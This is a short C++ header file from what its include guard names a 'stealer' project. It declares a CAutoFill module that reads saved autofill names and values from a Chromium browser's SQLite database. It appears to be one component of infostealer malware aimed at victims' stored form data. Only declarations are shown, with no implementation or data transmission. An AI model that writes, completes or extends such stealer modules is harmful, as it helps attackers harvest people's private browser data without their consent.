//
// Created by .1qxz on 09.06.2024.
//

#ifndef STEALER_CAUTOFILL_H
#define STEALER_CAUTOFILL_H


#include "../ChromiumBrowserModule.h"
#include "sqlite3.h"

struct AutoFill {
    std::string name;
    std::string value;
};

class CAutoFill : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
private:
    std::list<AutoFill> getAutoFill(const fs::path &db_path);
};


#endif //STEALER_CAUTOFILL_H
